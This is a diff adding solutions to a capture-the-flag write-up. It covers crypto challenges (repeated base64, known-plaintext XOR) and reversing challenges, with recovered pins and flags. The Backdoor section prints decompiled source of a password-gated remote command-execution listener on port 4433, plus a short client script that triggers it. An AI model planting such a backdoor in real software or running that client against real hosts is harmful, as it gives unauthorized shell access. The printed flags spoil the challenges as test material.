@@ -435,13 +435,32 @@ CHTB{d3struct0r5_m1n3f13ld}
 
 ## Nintendo Base64
 
-Solved By: ?
+Solved By: Legacyy
+
+We get the following ciphertext given in this challenge...
+```
+  
+            Vm                                                   0w               eE5GbFdWW         GhT            V0d4VVYwZ
+            G9              XV                                   mx              yWk    ZOV       1JteD           BaV     WRH
+                            YW                                   xa             c1              NsWl dS   M1   JQ WV       d4
+S2RHVkljRm  Rp UjJoMlZrZH plRmRHV m5WaVJtUl hUVEZLZVZk   V1VrZFpWMU  pHVDFaV1Z  tSkdXazlXYW   twdl   Yx    Wm Fj  bHBFVWxWTlZ
+Xdz     BWa 2M xVT     FSc  1d   uTl     hi R2h     XWW taS     1dG VXh     XbU ZTT     VdS elYy     cz     FWM    kY2VmtwV2
+JU       RX dZ ak       Zr  U0   ZOc2JGWmlS a3       BY V1       d0 YV       lV MH       hj RVpYYlVaVFRWW  mF lV  mt       3V
+lR       GV 01 ER       kh  Zak  5rVj   JFe VR       Ya Fdha   3BIV mpGU   2NtR kdX     bWx          oT   TB   KW VYxW   lNSM
+Wx       XW kV kV       mJ  GWlRZ bXMxY2xWc 1V       sZ  FRiR1J5VjJ  0a1YySkdj   RVpWVmxKV           1V            GRTlQUT09
+```
+
+Putting this into cyberchef, adding remove whitespace and then base64 decoding 8 times, gives us the flag.
+`CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}`
 
 ##
 
 ## PhaseStream 1
 
-Solved By: ?
+Solved By: Legacyy
+
+The plot to this challenge is that the plaintext has been XOR'd with a 5-byte repeating key, giving `2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904`. Luckily, we know the first 5 bytes of our flag are `CHTB{`. With this in mind, using cyberchef we can simply run Remove Whitespace > From Hex > XOR (Key: CHTB{ FORMAT: Latin1). This gives us the key mykey, changing the XOR key to mykey gives us the flag:
+`CHTB{u51ng_kn0wn_pl41nt3xt}`
 
 ##
 
@@ -622,17 +641,141 @@ Solved By: Legacyy & payl0ad
 
 Solved By: Legacyy
 
+Authenticator is a very simple binary, we need to bypass the authentication check.
+```
+./authenticator
+
+Authentication System 👽
+
+Please enter your credentials to continue.
+
+Alien ID: Test
+Access Denied!
+```
+
+Upon opening the binary in Ghidra, inside of `main` we see that our Alien ID is being compared to "11337"
+```iVar1 = strcmp(local_58,"11337\n");```
+
+After this, looking at the `checkpin()` function, we see the following line of decompilation...
+```if ((byte)("}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"[local_24] ^ 9U) != param_1[local_24])```
+
+This is simply XOR'ing the string `}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:` with `0x9`, and comparing it to the user input, this gives us the pin `th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3`. Thus the flag has been found.
+`CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}`
+
 ##
 
 ## Passphrase
 
 Solved By: Legacyy
 
+Passphrase is a fairly easy challenge of which takes the style of most simple crackme challenges
+
+Looking at the `main` function, we see an enormous amount of local variables...
+```
+flag = 0x33;
+local_57 = 0x78;
+local_56 = 0x74;
+local_55 = 0x72;
+local_54 = 0x34;
+local_53 = 0x74;
+local_52 = 0x33;
+local_51 = 0x72;
+local_50 = 0x52;
+local_4f = 0x33;
+local_4e = 0x73;
+local_4d = 0x74;
+local_4c = 0x52;
+local_4b = 0x31;
+local_4a = 0x34;
+local_49 = 0x4c;
+local_48 = 0x35;
+local_47 = 0x5f;
+local_46 = 0x56;
+local_45 = 0x53;
+local_44 = 0x5f;
+local_43 = 0x68;
+local_42 = 0x75;
+local_41 = 0x6d;
+local_40 = 0x34;
+local_3f = 0x6e;
+local_3e = 0x35;
+local_3d = 0;
+iVar1 = strcmp(&flag,user_input + 1);
+```
+
+Due to how these are stored in memory, this will actually create a string on the stack, decoding the hex from each variable, top to bottom we get the flag.
+`CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}`
+
 ##
 
 ## Backdoor
 
 Solved By: firedank
+
+We can first try and run strings on the binary.
+```
+_ssl.cpython-38-x86_64-linux-gnu.so
+```
+I see some python stuff. That makes me think this is a compiled python binary.
+we first dump the pydata via obj-copy:
+```
+objcopy --dump-section pydata=pydata.dump bd
+```
+
+We can then use pyinstxtractor to extract the python bytecode from the dump:
+```
+python3 pyinstxtractor/pyinstxtractor.py pydata.dump
+[+] Processing pydata.dump
+[+] Successfully extracted pyinstaller archive: pydata.dump
+```
+We can now use a python decompiler on the pyc files within the extracted directory. Inside the extracted directory we find the bytecode for bd.py in bd.pyc. We can use decompyle++: https://github.com/zrax/pycdc to decompile this bytecode into the python sourcecode:
+```python
+pycdc.exe bd.pyc
+
+import socket
+from hashlib import md5
+from subprocess import check_output
+sock = socket.socket()
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('0.0.0.0', 4433))
+sock.listen(5)
+(client, addr) = sock.accept()
+data = client.recv(32)
+if len(data) != 32:
+    client.close()
+    continue
+if data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
+    client.send(b'Invalid')
+    client.close()
+    continue
+size = client.recv(1)
+command = client.recv(int.from_bytes(size, 'little'))
+if not command.startswith(b'command:'):
+    client.close()
+    continue
+command = command.replace(b'command:', b'')
+output = check_output(command, True, **('shell',))
+client.send(output)
+client.close()
+continue
+```
+
+So we see that the binary first starts a listener on port 4433 and it then receives some data. It checks if the data received is an md5 hash and then see if the hash matches with the hash of "s4v3_th3_w0rld". If it isn't, it sends back "invalid". If it matches it then it receives one byte of data. It then receives as much data as the byte value of the single byte received before. It checks if the data received starts with "command:" and if it does it runs the text after as a command. So we can just give it a byte like F and then send our command we want to run. Here is my exploit:
+```
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(1)
+s.connect(("192.168.1.128", 4433))
+s.send(b"e2162a8692df4e158e6fd33d1467dfe0")
+s.send(b"F")
+s.send(b"command: cat flag.txt")
+print(s.recv(1024))
+```
+and when we run it we receive:
+```
+python3 exploit.py
+b'CHTB{b4ckd00r5_4r3_d4nG3r0u5}\n'
+```
+Flag: `CHTB{b4ckd00r5_4r3_d4nG3r0u5}`
 
 # Forensics
 
